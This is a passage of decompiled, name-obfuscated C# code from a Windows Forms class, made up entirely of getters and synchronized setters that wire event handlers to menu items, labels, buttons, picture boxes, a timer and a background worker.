	internal void vmethod_197(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_62);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_45;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_45 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_45;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005E3 RID: 1507 RVA: 0x0000577F File Offset: 0x0000397F
	internal ToolStripMenuItem vmethod_198()
	{
		return this.toolStripMenuItem_46;
	}

	// Token: 0x060005E4 RID: 1508 RVA: 0x00036C08 File Offset: 0x00034E08
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_199(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_63);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_46;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_46 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_46;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005E5 RID: 1509 RVA: 0x00005787 File Offset: 0x00003987
	internal ToolStripMenuItem vmethod_200()
	{
		return this.toolStripMenuItem_47;
	}

	// Token: 0x060005E6 RID: 1510 RVA: 0x00036C4C File Offset: 0x00034E4C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_201(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_63);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_47;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_47 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_47;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005E7 RID: 1511 RVA: 0x0000578F File Offset: 0x0000398F
	internal ToolStripMenuItem vmethod_202()
	{
		return this.toolStripMenuItem_48;
	}

	// Token: 0x060005E8 RID: 1512 RVA: 0x00036C90 File Offset: 0x00034E90
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_203(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_63);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_48;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_48 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_48;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005E9 RID: 1513 RVA: 0x00005797 File Offset: 0x00003997
	internal Panel vmethod_204()
	{
		return this.panel_1;
	}

	// Token: 0x060005EA RID: 1514 RVA: 0x0000579F File Offset: 0x0000399F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_205(Panel panel_2)
	{
		this.panel_1 = panel_2;
	}

	// Token: 0x060005EB RID: 1515 RVA: 0x000057A8 File Offset: 0x000039A8
	internal Label vmethod_206()
	{
		return this.label_9;
	}

	// Token: 0x060005EC RID: 1516 RVA: 0x000057B0 File Offset: 0x000039B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_207(Label label_30)
	{
		this.label_9 = label_30;
	}

	// Token: 0x060005ED RID: 1517 RVA: 0x000057B9 File Offset: 0x000039B9
	internal Label vmethod_208()
	{
		return this.label_10;
	}

	// Token: 0x060005EE RID: 1518 RVA: 0x000057C1 File Offset: 0x000039C1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_209(Label label_30)
	{
		this.label_10 = label_30;
	}

	// Token: 0x060005EF RID: 1519 RVA: 0x000057CA File Offset: 0x000039CA
	internal Label vmethod_210()
	{
		return this.label_11;
	}

	// Token: 0x060005F0 RID: 1520 RVA: 0x000057D2 File Offset: 0x000039D2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_211(Label label_30)
	{
		this.label_11 = label_30;
	}

	// Token: 0x060005F1 RID: 1521 RVA: 0x000057DB File Offset: 0x000039DB
	internal Label vmethod_212()
	{
		return this.label_12;
	}

	// Token: 0x060005F2 RID: 1522 RVA: 0x000057E3 File Offset: 0x000039E3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_213(Label label_30)
	{
		this.label_12 = label_30;
	}

	// Token: 0x060005F3 RID: 1523 RVA: 0x000057EC File Offset: 0x000039EC
	internal ZeroitProgressBarNormal vmethod_214()
	{
		return this.zeroitProgressBarNormal_1;
	}

	// Token: 0x060005F4 RID: 1524 RVA: 0x000057F4 File Offset: 0x000039F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_215(ZeroitProgressBarNormal zeroitProgressBarNormal_2)
	{
		this.zeroitProgressBarNormal_1 = zeroitProgressBarNormal_2;
	}

	// Token: 0x060005F5 RID: 1525 RVA: 0x000057FD File Offset: 0x000039FD
	internal ToolStripMenuItem vmethod_216()
	{
		return this.toolStripMenuItem_49;
	}

	// Token: 0x060005F6 RID: 1526 RVA: 0x00005805 File Offset: 0x00003A05
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_217(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_49 = toolStripMenuItem_136;
	}

	// Token: 0x060005F7 RID: 1527 RVA: 0x0000580E File Offset: 0x00003A0E
	internal ToolStripMenuItem vmethod_218()
	{
		return this.toolStripMenuItem_50;
	}

	// Token: 0x060005F8 RID: 1528 RVA: 0x00005816 File Offset: 0x00003A16
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_219(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_50 = toolStripMenuItem_136;
	}

	// Token: 0x060005F9 RID: 1529 RVA: 0x0000581F File Offset: 0x00003A1F
	internal ToolStripMenuItem vmethod_220()
	{
		return this.toolStripMenuItem_51;
	}

	// Token: 0x060005FA RID: 1530 RVA: 0x00036CD4 File Offset: 0x00034ED4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_221(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_65);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_51;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_51 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_51;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005FB RID: 1531 RVA: 0x00005827 File Offset: 0x00003A27
	internal ToolStripMenuItem vmethod_222()
	{
		return this.toolStripMenuItem_52;
	}

	// Token: 0x060005FC RID: 1532 RVA: 0x0000582F File Offset: 0x00003A2F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_223(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_52 = toolStripMenuItem_136;
	}

	// Token: 0x060005FD RID: 1533 RVA: 0x00005838 File Offset: 0x00003A38
	internal ToolStripMenuItem vmethod_224()
	{
		return this.toolStripMenuItem_53;
	}

	// Token: 0x060005FE RID: 1534 RVA: 0x00036D18 File Offset: 0x00034F18
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_225(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_64);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_53;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_53 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_53;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005FF RID: 1535 RVA: 0x00005840 File Offset: 0x00003A40
	internal ToolStripMenuItem vmethod_226()
	{
		return this.toolStripMenuItem_54;
	}

	// Token: 0x06000600 RID: 1536 RVA: 0x00036D5C File Offset: 0x00034F5C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_227(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_64);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_54;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_54 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_54;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000601 RID: 1537 RVA: 0x00005848 File Offset: 0x00003A48
	internal ToolStripMenuItem vmethod_228()
	{
		return this.toolStripMenuItem_55;
	}

	// Token: 0x06000602 RID: 1538 RVA: 0x00036DA0 File Offset: 0x00034FA0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_229(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_66);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_55;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_55 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_55;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000603 RID: 1539 RVA: 0x00005850 File Offset: 0x00003A50
	internal ToolStripMenuItem vmethod_230()
	{
		return this.toolStripMenuItem_56;
	}

	// Token: 0x06000604 RID: 1540 RVA: 0x00036DE4 File Offset: 0x00034FE4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_231(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_66);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_56;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_56 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_56;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000605 RID: 1541 RVA: 0x00005858 File Offset: 0x00003A58
	internal ToolStripMenuItem vmethod_232()
	{
		return this.toolStripMenuItem_57;
	}

	// Token: 0x06000606 RID: 1542 RVA: 0x00036E28 File Offset: 0x00035028
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_233(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_67);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_57;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_57 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_57;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000607 RID: 1543 RVA: 0x00005860 File Offset: 0x00003A60
	internal ToolStripMenuItem vmethod_234()
	{
		return this.toolStripMenuItem_58;
	}

	// Token: 0x06000608 RID: 1544 RVA: 0x00036E6C File Offset: 0x0003506C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_235(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_67);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_58;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_58 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_58;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000609 RID: 1545 RVA: 0x00005868 File Offset: 0x00003A68
	internal ToolStripMenuItem vmethod_236()
	{
		return this.toolStripMenuItem_59;
	}

	// Token: 0x0600060A RID: 1546 RVA: 0x00036EB0 File Offset: 0x000350B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_237(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_68);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_59;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_59 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_59;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600060B RID: 1547 RVA: 0x00005870 File Offset: 0x00003A70
	internal ToolStripMenuItem vmethod_238()
	{
		return this.toolStripMenuItem_60;
	}

	// Token: 0x0600060C RID: 1548 RVA: 0x00036EF4 File Offset: 0x000350F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_239(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_68);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_60;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_60 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_60;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600060D RID: 1549 RVA: 0x00005878 File Offset: 0x00003A78
	internal ToolStripMenuItem vmethod_240()
	{
		return this.toolStripMenuItem_61;
	}

	// Token: 0x0600060E RID: 1550 RVA: 0x00036F38 File Offset: 0x00035138
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_241(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_68);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_61;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_61 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_61;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600060F RID: 1551 RVA: 0x00005880 File Offset: 0x00003A80
	internal ToolStripMenuItem vmethod_242()
	{
		return this.toolStripMenuItem_62;
	}

	// Token: 0x06000610 RID: 1552 RVA: 0x00036F7C File Offset: 0x0003517C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_243(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_71);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_62;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_62 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_62;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000611 RID: 1553 RVA: 0x00005888 File Offset: 0x00003A88
	internal ToolStripSeparator vmethod_244()
	{
		return this.toolStripSeparator_12;
	}

	// Token: 0x06000612 RID: 1554 RVA: 0x00005890 File Offset: 0x00003A90
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_245(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_12 = toolStripSeparator_39;
	}

	// Token: 0x06000613 RID: 1555 RVA: 0x00005899 File Offset: 0x00003A99
	internal CheckBox vmethod_246()
	{
		return this.checkBox_2;
	}

	// Token: 0x06000614 RID: 1556 RVA: 0x00036FC0 File Offset: 0x000351C0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_247(CheckBox checkBox_8)
	{
		EventHandler value = new EventHandler(this.method_79);
		CheckBox checkBox = this.checkBox_2;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_2 = checkBox_8;
		checkBox = this.checkBox_2;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x06000615 RID: 1557 RVA: 0x000058A1 File Offset: 0x00003AA1
	internal PictureBox vmethod_248()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06000616 RID: 1558 RVA: 0x00037004 File Offset: 0x00035204
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_249(PictureBox pictureBox_7)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_182);
		MouseEventHandler value2 = new MouseEventHandler(this.method_183);
		MouseEventHandler value3 = new MouseEventHandler(this.method_184);
		MouseEventHandler value4 = new MouseEventHandler(this.method_185);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.MouseDown -= value;
			pictureBox.MouseUp -= value2;
			pictureBox.MouseMove -= value3;
			pictureBox.MouseWheel -= value4;
		}
		this.pictureBox_1 = pictureBox_7;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.MouseDown += value;
			pictureBox.MouseUp += value2;
			pictureBox.MouseMove += value3;
			pictureBox.MouseWheel += value4;
		}
	}

	// Token: 0x06000617 RID: 1559 RVA: 0x000058A9 File Offset: 0x00003AA9
	internal ComboBox vmethod_250()
	{
		return this.comboBox_2;
	}

	// Token: 0x06000618 RID: 1560 RVA: 0x000058B1 File Offset: 0x00003AB1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_251(ComboBox comboBox_9)
	{
		this.comboBox_2 = comboBox_9;
	}

	// Token: 0x06000619 RID: 1561 RVA: 0x000058BA File Offset: 0x00003ABA
	internal TabPage vmethod_252()
	{
		return this.tabPage_4;
	}

	// Token: 0x0600061A RID: 1562 RVA: 0x000058C2 File Offset: 0x00003AC2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_253(TabPage tabPage_17)
	{
		this.tabPage_4 = tabPage_17;
	}

	// Token: 0x0600061B RID: 1563 RVA: 0x000058CB File Offset: 0x00003ACB
	internal Label vmethod_254()
	{
		return this.label_13;
	}

	// Token: 0x0600061C RID: 1564 RVA: 0x000058D3 File Offset: 0x00003AD3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_255(Label label_30)
	{
		this.label_13 = label_30;
	}

	// Token: 0x0600061D RID: 1565 RVA: 0x000058DC File Offset: 0x00003ADC
	internal Label vmethod_256()
	{
		return this.label_14;
	}

	// Token: 0x0600061E RID: 1566 RVA: 0x000058E4 File Offset: 0x00003AE4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_257(Label label_30)
	{
		this.label_14 = label_30;
	}

	// Token: 0x0600061F RID: 1567 RVA: 0x000058ED File Offset: 0x00003AED
	internal VisualButton vmethod_258()
	{
		return this.visualButton_1;
	}

	// Token: 0x06000620 RID: 1568 RVA: 0x0003709C File Offset: 0x0003529C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_259(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_82);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_24;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000621 RID: 1569 RVA: 0x000058F5 File Offset: 0x00003AF5
	internal Label vmethod_260()
	{
		return this.label_15;
	}

	// Token: 0x06000622 RID: 1570 RVA: 0x000058FD File Offset: 0x00003AFD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_261(Label label_30)
	{
		this.label_15 = label_30;
	}

	// Token: 0x06000623 RID: 1571 RVA: 0x00005906 File Offset: 0x00003B06
	internal VisualButton vmethod_262()
	{
		return this.visualButton_2;
	}

	// Token: 0x06000624 RID: 1572 RVA: 0x000370E0 File Offset: 0x000352E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_263(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_83);
		VisualButton visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_2 = visualButton_24;
		visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000625 RID: 1573 RVA: 0x0000590E File Offset: 0x00003B0E
	internal PictureBox vmethod_264()
	{
		return this.pictureBox_2;
	}

	// Token: 0x06000626 RID: 1574 RVA: 0x00005916 File Offset: 0x00003B16
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_265(PictureBox pictureBox_7)
	{
		this.pictureBox_2 = pictureBox_7;
	}

	// Token: 0x06000627 RID: 1575 RVA: 0x0000591F File Offset: 0x00003B1F
	internal ToolStripMenuItem vmethod_266()
	{
		return this.toolStripMenuItem_63;
	}

	// Token: 0x06000628 RID: 1576 RVA: 0x00037124 File Offset: 0x00035324
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_267(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_81);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_63;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_63 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_63;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000629 RID: 1577 RVA: 0x00005927 File Offset: 0x00003B27
	internal ComboBox vmethod_268()
	{
		return this.comboBox_3;
	}

	// Token: 0x0600062A RID: 1578 RVA: 0x0000592F File Offset: 0x00003B2F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_269(ComboBox comboBox_9)
	{
		this.comboBox_3 = comboBox_9;
	}

	// Token: 0x0600062B RID: 1579 RVA: 0x00005938 File Offset: 0x00003B38
	internal TabPage vmethod_270()
	{
		return this.tabPage_5;
	}

	// Token: 0x0600062C RID: 1580 RVA: 0x00005940 File Offset: 0x00003B40
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_271(TabPage tabPage_17)
	{
		this.tabPage_5 = tabPage_17;
	}

	// Token: 0x0600062D RID: 1581 RVA: 0x00005949 File Offset: 0x00003B49
	internal ToolStripMenuItem vmethod_272()
	{
		return this.toolStripMenuItem_64;
	}

	// Token: 0x0600062E RID: 1582 RVA: 0x00005951 File Offset: 0x00003B51
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_273(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_64 = toolStripMenuItem_136;
	}

	// Token: 0x0600062F RID: 1583 RVA: 0x0000595A File Offset: 0x00003B5A
	internal ToolStripMenuItem vmethod_274()
	{
		return this.toolStripMenuItem_65;
	}

	// Token: 0x06000630 RID: 1584 RVA: 0x00037168 File Offset: 0x00035368
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_275(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_85);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_65;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_65 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_65;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000631 RID: 1585 RVA: 0x00005962 File Offset: 0x00003B62
	internal ToolStripSeparator vmethod_276()
	{
		return this.toolStripSeparator_13;
	}

	// Token: 0x06000632 RID: 1586 RVA: 0x0000596A File Offset: 0x00003B6A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_277(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_13 = toolStripSeparator_39;
	}

	// Token: 0x06000633 RID: 1587 RVA: 0x00005973 File Offset: 0x00003B73
	internal ToolStripMenuItem vmethod_278()
	{
		return this.toolStripMenuItem_66;
	}

	// Token: 0x06000634 RID: 1588 RVA: 0x000371AC File Offset: 0x000353AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_279(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_86);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_66;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_66 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_66;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000635 RID: 1589 RVA: 0x0000597B File Offset: 0x00003B7B
	internal RichTextBox vmethod_280()
	{
		return this.richTextBox_0;
	}

	// Token: 0x06000636 RID: 1590 RVA: 0x00005983 File Offset: 0x00003B83
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_281(RichTextBox richTextBox_5)
	{
		this.richTextBox_0 = richTextBox_5;
	}

	// Token: 0x06000637 RID: 1591 RVA: 0x0000598C File Offset: 0x00003B8C
	internal BackgroundWorker vmethod_282()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06000638 RID: 1592 RVA: 0x000371F0 File Offset: 0x000353F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_283(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_89);
		ProgressChangedEventHandler value2 = new ProgressChangedEventHandler(this.method_92);
		RunWorkerCompletedEventHandler value3 = new RunWorkerCompletedEventHandler(this.method_93);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
			backgroundWorker.ProgressChanged -= value2;
			backgroundWorker.RunWorkerCompleted -= value3;
		}
		this.backgroundWorker_0 = backgroundWorker_4;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
			backgroundWorker.ProgressChanged += value2;
			backgroundWorker.RunWorkerCompleted += value3;
		}
	}

	// Token: 0x06000639 RID: 1593 RVA: 0x00005994 File Offset: 0x00003B94
	internal TabPage vmethod_284()
	{
		return this.tabPage_6;
	}

	// Token: 0x0600063A RID: 1594 RVA: 0x0000599C File Offset: 0x00003B9C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_285(TabPage tabPage_17)
	{
		this.tabPage_6 = tabPage_17;
	}

	// Token: 0x0600063B RID: 1595 RVA: 0x000059A5 File Offset: 0x00003BA5
	internal RichTextBox vmethod_286()
	{
		return this.richTextBox_1;
	}

	// Token: 0x0600063C RID: 1596 RVA: 0x000059AD File Offset: 0x00003BAD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_287(RichTextBox richTextBox_5)
	{
		this.richTextBox_1 = richTextBox_5;
	}

	// Token: 0x0600063D RID: 1597 RVA: 0x000059B6 File Offset: 0x00003BB6
	internal System.Windows.Forms.Timer vmethod_288()
	{
		return this.timer_0;
	}

	// Token: 0x0600063E RID: 1598 RVA: 0x0003726C File Offset: 0x0003546C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_289(System.Windows.Forms.Timer timer_4)
	{
		EventHandler value = new EventHandler(this.method_94);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_4;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x0600063F RID: 1599 RVA: 0x000059BE File Offset: 0x00003BBE
	internal ZeroitAnidasoCircleProgress vmethod_290()
	{
		return this.zeroitAnidasoCircleProgress_1;
	}

	// Token: 0x06000640 RID: 1600 RVA: 0x000059C6 File Offset: 0x00003BC6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_291(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_1 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x06000641 RID: 1601 RVA: 0x000059CF File Offset: 0x00003BCF
	internal CheckBox vmethod_292()
	{
		return this.checkBox_3;
	}

	// Token: 0x06000642 RID: 1602 RVA: 0x000372B0 File Offset: 0x000354B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_293(CheckBox checkBox_8)
	{
		EventHandler value = new EventHandler(this.method_168);
		KeyEventHandler value2 = new KeyEventHandler(this.method_177);
		CheckBox checkBox = this.checkBox_3;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
			checkBox.KeyDown -= value2;
		}
		this.checkBox_3 = checkBox_8;
		checkBox = this.checkBox_3;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
			checkBox.KeyDown += value2;
		}
	}

	// Token: 0x06000643 RID: 1603 RVA: 0x000059D7 File Offset: 0x00003BD7
	internal ToolStripMenuItem vmethod_294()
	{
		return this.toolStripMenuItem_67;
	}

	// Token: 0x06000644 RID: 1604 RVA: 0x00037310 File Offset: 0x00035510
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_295(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_43);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_67;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_67 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_67;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000645 RID: 1605 RVA: 0x000059DF File Offset: 0x00003BDF
	internal ToolStripMenuItem vmethod_296()
	{
		return this.toolStripMenuItem_68;
	}

	// Token: 0x06000646 RID: 1606 RVA: 0x00037354 File Offset: 0x00035554
